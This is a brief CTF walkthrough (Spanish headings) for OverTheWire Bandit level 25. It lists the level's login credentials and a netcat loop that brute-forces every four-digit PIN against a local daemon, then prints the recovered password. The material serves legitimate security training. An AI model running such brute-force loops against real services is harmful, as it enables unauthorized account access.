## Level 25
## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
## Datos de acceso
	Server: bandit.labs.overthewire.org
	User: bandit24
	Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
	
## Solución
	nc localhost 30002
	for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong

	p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
## Notas adicionales

## Referencias